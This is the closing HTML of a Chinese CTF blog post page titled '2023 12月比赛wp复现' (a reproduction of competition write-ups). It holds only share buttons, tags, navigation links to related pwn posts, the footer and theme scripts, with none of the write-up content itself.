  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://chuw3i.github.io/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/" data-hashtag="赛题复现"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://chuw3i.github.io/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/" data-title="2023 12月比赛wp复现"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="post-tag" title="标签 - 赛题复现">赛题复现</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/stack-challenge/" class="post-nav-item" rel="prev" title="Stack Challenge"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Stack Challenge</a><a href="/posts/pwn%E6%9D%82%E8%AE%B0/" class="post-nav-item" rel="next" title="PWN杂记">PWN杂记<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.147.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.21-a85a6655"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">chuwei</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":true,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.6,"type":"fuse","useExtendedSearch":true},"version":"v0.3.21-a85a6655"};</script><script src="/js/theme.min.js" defer></script></body>
</html>
